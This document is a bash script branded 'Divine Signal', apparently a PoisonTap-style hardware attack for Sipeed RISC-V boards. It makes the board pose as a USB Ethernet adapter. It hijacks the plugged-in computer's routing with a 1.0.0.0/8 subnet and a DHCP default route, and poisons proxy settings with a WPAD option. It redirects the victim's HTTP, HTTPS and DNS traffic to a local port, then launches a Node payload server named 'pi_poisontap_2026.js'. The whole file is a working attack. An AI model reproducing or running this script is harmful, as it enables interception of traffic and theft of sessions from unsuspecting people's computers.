#!/bin/bash
set -euo pipefail
# Divine Signal | Optimized for Sipeed RISC-V (D1/BL808) + Linux

# For Sipeed D1/sunxi or BL808 kernels, the UDC name often differs
UDC_NAME=$(ls /sys/class/udc | head -n 1)
CONFIG="/sys/kernel/config/usb_gadget/divine"
WLAN_IF="usb0"
SUBNET="1.0.0.0/8"
GATEWAY="1.0.0.1"
DNS_PORT=5353

# Clean old gadget
if [ -d "$CONFIG" ]; then
    echo "" > "$CONFIG/UDC" 2>/dev/null || true
    rm -rf "$CONFIG"
fi

mkdir -p "$CONFIG"
cd "$CONFIG"

# USB Descriptors
echo 0x1d6b > idVendor
echo 0x0104 > idProduct
echo 0x0100 > bcdDevice
echo 0x0200 > bcdUSB
mkdir -p strings/0x409
echo "DIVINE_$(date +%s)" > strings/0x409/serialnumber
echo "DivineSignal" > strings/0x409/manufacturer
echo "USB Divine Adapter" > strings/0x409/product

mkdir -p configs/c.1/strings/0x409
echo "CDC Ethernet (Divine)" > configs/c.1/strings/0x409/configuration
echo 250 > configs/c.1/MaxPower

mkdir -p functions/ecm.usb0
# Use unique MACs
echo "42:61:64:55:53:42" > functions/ecm.usb0/dev_addr
echo "48:6f:73:74:50:43" > functions/ecm.usb0/host_addr
ln -s functions/ecm.usb0 configs/c.1/

# Enable the gadget
echo "$UDC_NAME" > UDC

# Network Stack
ip link set "$WLAN_IF" up
ip addr add "$GATEWAY"/8 dev "$WLAN_IF"
sysctl -w net.ipv4.ip_forward=1

# nftables/iptables logic (fallback to iptables if nft is missing on busybox)
if command -v nft >/dev/null; then
    nft flush ruleset 2>/dev/null
    nft add table inet divine
    nft add chain inet divine prerouting '{ type nat hook prerouting priority -100; }'
    nft add rule inet divine prerouting iifname "$WLAN_IF" tcp dport 80 redirect to 1337
    nft add rule inet divine prerouting iifname "$WLAN_IF" tcp dport 443 redirect to 1337
    nft add rule inet divine prerouting iifname "$WLAN_IF" udp dport 53 redirect to $DNS_PORT
else
    iptables -t nat -A PREROUTING -i "$WLAN_IF" -p tcp --dport 80 -j REDIRECT --to-port 1337
    iptables -t nat -A PREROUTING -i "$WLAN_IF" -p tcp --dport 443 -j REDIRECT --to-port 1337
    iptables -t nat -A PREROUTING -i "$WLAN_IF" -p udp --dport 53 -j REDIRECT --to-port $DNS_PORT
fi

# dnsmasq
dnsmasq --interface="$WLAN_IF" \
        --dhcp-range=1.0.0.2,1.0.0.250,12h \
        --dhcp-option=option:dns-server,1.0.0.1 \
        --dhcp-option=option:route,0.0.0.0,0 \
        --dhcp-option=252,"http://1.0.0.1:1337/wpad" \
        --cache-size=0 \
        --bind-dynamic \
        --no-resolv \
        --server=8.8.8.8 \
        &

# Launch payload server (assuming node is present)
exec node --no-warnings --max-old-space-size=64 /opt/divine/pi_poisontap_2026.js
